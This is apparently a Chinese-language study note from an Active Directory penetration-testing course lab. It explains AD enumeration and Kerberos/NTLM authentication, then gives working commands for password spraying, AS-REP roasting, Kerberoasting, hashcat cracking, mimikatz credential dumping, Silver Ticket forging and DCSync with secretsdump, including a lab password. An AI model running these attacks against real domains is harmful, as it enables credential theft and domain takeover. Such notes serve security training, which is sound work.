# AD

## introduction and enumeration

### introduction

AD中存着：

1. ou  	 	组织单位
2. 对象 		...
3. 属性 		...

权限：

1. 域管理员 域管理员成员
2. 域森林中每个域都有一个域管理员

### manual enumeration

手动：有一个普通用户的rdp权限

1. 列举域用户，查看域用户信息，找管理员
2. 列举组，列举组成员

自动：

先使用PowerShell和特定的.NET类来找到 保存PdcRoleOwner属性的DC，再找到PDC

LDAP://主机名:端口号/DistinguishedName

DN是在AD中唯一标识对象的名称，如`CN=Stephanie,CN=Users,DC=corp,DC=com`。CN被称为通用名称，它指定了域中对象的标识符。

从右往左读，AD代表域控，CN=Users代表存储用户对象的容器的通用名称（父容器），最左边代表用户对象本身的通用名称

```
## 这种方式获取的DN不符合ldap的命名标准
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = $doaminObj.PdcRoleOwner.name
$PDC

```
使用ADSI来检索DN

```
ps> ([adsi]'').distinguishedName
```
脚本
```
//获取完整LDAP路径
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]"LDAP://$PDC").distinguishedName
$LDAP = "LDAP://$PDC/$DN"
$LDAP

//搜索 对象
//返回指向层次结构顶部的LDAP路径
$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
//返回在AD中找到的所有条目的集合
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
//过滤 枚举域中所有用户对象
$dirsearcher.Filter = "samAccountType=805306368"  //filter
$result = $dirsearcher.FindALL()

//打印对象的属性
Foreach($obj in $result){
    Foreach($prop in $obj.properties)
    {
        $prop
    }
    write-host "----------------------"
}

```
脚本封装成函数
```bash
function LDAPSearch{
    param (
        [string]$LDAPQuery
    )
    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DN = ([adsi]"LDAP://$PDC").distinguishedName

    $dirEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DN")
    $dirsearch = New-Object System.DirectoryServices.DirectorySearcher($direntry,$LDAPQuery)
    return $dirsearch.FindAll()
}


-ep bypass
ps> import-module .\function.ps1
	## 域中所有用户对象
		ps> LDAPSearch -LDAPQuery "samAccountType=805306368"
	## 域中所有组
		objectclass=group


	### 列举域中的每个可用组并显示用户成员
		foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) { $group.properties | select {$_.cn}, {$_.member}}
	### 查询指定组
		$group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Service Personnel*))"
	### 查询此组属性
		$group.properties
		$group.properties.xxx
	### 查询指定成员
		$group = LDAPSearch -LDAPQuery "(&(objectCategory=user)(cn=michelle))"
	### 查询此成员属性	
		$group.properties
		$group.properties.xxx

```

##### Powerview
```bash
import-module .\PowerView.ps1
### 获取域的基本信息
get-netdoamin
### 枚举对象上的所有属性 + 筛选cn
get-netuser ｜ select cn,pwdlastset,lastlogon

get-netgroup | select cn

### 筛选属性
Get-NetGroup "Sales Department" | select member

```

### expand our repertoire
获取域中所有计算机对象
```bash
### 枚举域中的计算机对象
get-NetComputer 
### select属性
get-netcomputer | select operatingsystem,dnshostname
```
获取overview
```bash
### 判断当前用户是否在域内机器上有管理员权限
##这个函数将连接到目标机器上的SCM，他是维护windows计算机上安装的服务和驱动程序的数据库，powerview尝试以SC_MANAGER_ALL_ACCESS访问权限打开数据库，需要管理员权限，如果成功，那么当前用户就是管理员
ps> Find-LocaAdminAccess 

### 查找已经登陆的用户
此命令使用NetWkstaUserEnum和NetSessionEnum api来枚举。前者需要管理员权限，后者不需要
Get-NetSession  -ComputerName xxxx
Get-NetSession  -ComputerName xxxx -Verbose
报错了，无权限
换工具使用PsLoggedOn
ps> .\PsLoggedon.exe \\files04

###列举SPN 服务主体名称
setspn -L userxxx
或
get-netuser -spn | select samaccountname,servicprincipleName



```
##### domain share 
```bash
Find-DoaminShare

SYSVOL,它可能包含驻留在域控制器本身上的文件和文件夹。这个特定的共享通常用于各种域策略和脚本。默认情况下，SYSVOL文件夹在域控制器上映射为%SystemRoot%\SYSVOL\Sysvol\domainname，并且每个域用户都可以访问它。

组策略首选项（GPP）存储的密码使用AES-256【加密，但是加密密钥是公开的，所以可以解密】
kali> gpp-decrypt "xxxxx"

```

### auto enumeration
##### SharpHound
```
import-module .\SharpHound.ps1
get-help invoke-bloodhound
```
###尝试收集所有数据，这将执行除了本地组策略之外的所有收集方法
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"

##### BloodHound
```
kali> bloodhound
```

## attacking AD Auth


### AD authentication

#### NTLM

![image-20230815204522839](https://cdn.jsdelivr.net/gh/klearcc/pic/img202308161519135.png)
8位字符 2.5h破解

#### Keberos Authentication

![image-20230816151936961](https://cdn.jsdelivr.net/gh/klearcc/pic/img202308161519059.png)

和NTLM的区别：使用NTLM身份认证时，client会直接与application server通信；使用Kerberos时，client会与KDC（密钥分发中心，运行在dc上）通信。

Keberos验证流程
1. client先向KDC发送AS-REQ，其中包含 由用户名和密码生成的hash 加密 的timestamp

2. KDC收到请求后，会在ntds.dit中查找相关联的用户的hash，并用这个hash解密timestamp，如果时间戳解密成功并不重复，则视为成功。成功的话会回复一个AS-REP，其中包含session key和TGT。     
session key使用用户密码hash加密，并且可以重复使用；     
TGT包含有关用户、域、时间戳、客户端的IP地址和session key的信息，其由secret key（krbtgt账户的NTLM hash）加密，只有KDC知道。

3. client构建一个TGS-REQ请求，其中包含 当前用户名、使用session key加密的timestamp、name of resource、加密的TGT

4. KDC收到请求后，如果resource在域中，kdc会使用只有自己知道的secret key解密TGT。然后从TGT中提取session key，用它来解密用户名和时间戳。
检查内容：时间戳有效；用户名必须和TGT中的用户名相同；ip要和TGT中的ip相同。
成功后，回复TGS-REP至client。   
TGS-REP包含：   
    已授权访问的name of resource；      
	用于client和service之间的session key；      
	包含用户名、组成员资格、新创建的session key的service ticket。       
service ticket的service名和session key使用只有kdc知道的原始secret key加密；     
service ticket使用 所涉及服务注册的 服务账户密码hash(SPN的密码hash) 加密。

一旦KDC完成身份验证过程，并且客户端拥有session key和服务票据，service认证就开始。

5. 首先cilent向application server发送AP-REQ，其中包括用户名、使用 和serviceTicket相关的session key 加密的 时间戳、service ticket

6. application server使用服务账户密码哈希(SPN的密码哈希)解密service ticket，从中提取用户名和session key。再使用session key解密AP-REQ中的用户名。如果解密的用户名和AP-REQ中的用户名相同，则接受此请求。
服务检查service ticket中提供的组成员资格，并为用户分配适当的权限。






#### Cached AD Credentials
密码hash存储在：LSASS（本地安全性身份验证子系统服务）中
lsass进程以system身份运行，，所以使用SYSTEM或本地管理员权限才能访问目标上存储的hash

使用mimikatz，但避免将其作为独立应用程序使用。
可以使用像PowerShell这样的注入器直接从内存中执行Mimikatz，或者使用内置工具如任务管理器来转储整个LSASS进程内存，将转储的数据移动到辅助机器，然后将数据加载到Mimikatz中。

windows开启额外的LSA，LSA包括LSASS进程，windows防止从该进程读取内存

系统内可食用的hash算法
Windows 2003的AD实例，NTLM是唯一可用的哈希算法
Windows Server 2008或更高版本的实例，可能同时可用NTLM和SHA-1
win7上使用WDigest，mimikatz可提取明文

Keberos TGT 和 service ticket 会存储在LSASS中，mimikatz可提取

公钥基础设施（PKI）Public Key Infrastructure。
AD CS实现PKI，这个服务在经过身份验证的用户和可信资源之间交换数字证书。


### attack
#### password
##### password spraying 密码喷洒
1. LDAP ADSI
    ```bash
    powershell -ep bypass
    .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
    ```
2. SMB
    ```bash
    流量多 速度慢
    pwn3d >> 管理员权限
    crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
    ```
3. TGT
    ```bash
    ###kerbrute  
    https://github.com/ropnop/kerbrute
    
    ```

#### AS-REP Roasting
Keberos域认证默认开启

Keberos预认证：首先发送AS-REQ。根据此请求，域控制器可以验证身份验证是否成功。如果成功，域控制器将回复一个包含会话密钥和TGT的AS-REP。

AS-REP Roasting：没有Kerberos预身份验证时，攻击者可以代表任何AD用户向域控制器发送AS-REQ。在从域控制器获取AS-REP之后，攻击者可以对响应的加密部分进行离线密码攻击。

```bash
kali
###利用
kali> impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete
工具默认生成的hash格式和hashcat相同
###破解
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt
-r /usr/share/hashcat/rules/best64.rule --force

win
###利用
win> .\Rubeus.exe asreproast /nowrap
###破解
hashcat
```

#### Kerberoasting 
滥用SPN获取TGS-REP哈希 + hash破解（字典）
服务主体名称（SPN）Service Principal Name托管很多resource

用户想要请求SPN托管的资源时，client会发送service ticket给application server，应用服务器会使用SPN的密码哈希进行解密。

###limit    
If SPN run in the context of a computer account, a managed service account, or a group-managed service, the password will be randomly generated, and 120 characters long, making cracking infeasible.
Only in the context of a user accounts is much higher.



获取TGS-REP并解明文密码
```bash
win
### 识别与域用户关联的所有SPN  生成的TGS-REP保存到文件 
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
-r /usr/share/hashcat/rules/best64.rule --force

linux
kali> impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```

#### Silver Tickets   不需要获取明文密码

有了service account password 或者 与其关联的NTLM hash，可以构造自己的service ticket来访问目标resource，并且拥有任意权限。这个ticket叫silver ticket。

silver ticket的构造：
> SPN密码hash值      ###mimikatz获取 一般情况下需要权限         
> doamin SID        ###mimikatz获取或whoami /user  
> Target SPN        ###resource的SPN    

```
###制造silver ticket
mimikatz>kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin

###查看
klist

```

修复

```
 https://support.microsoft.com/en-gb/topic/kb5008380-authentication-updates-cve-2021-42287-9dafac11-e0d0-4cb8-959a-143bd0201041
 
 如果没有这个补丁 就可以生成白银票据  silver ticket
```

#### Domain Controller Synchronization
条件：权限。如下    

DRS(Directory Replication Service)域同步服务，使用复制来同步冗余的域控。域控可以使用IDL_DRSGetNCChanges API来请求特定对象的更新

接收更新请求的dc不检查请求是否来自已知的dc，它只验证相关的SID是否具有适当的权限

scsysnc需要的权限：Reolicating Directory Changes,Replicating Directory Changes ALL, Replicating Directory Changes in Filtered Set rights.Domain Admins,Enterprise Admins, Administrators groups有权限。

有权限时可以dcsync，伪装成dc。从域中请求任何用户的凭据。

tools
```
###win   
/user:要获取凭据的域用户名
mimikatz> lsadump::dcsync /user:corp\dave

拿到NTLM hash后
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force


###linux
kali> impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70

```






## Lateral Movement  域横向
##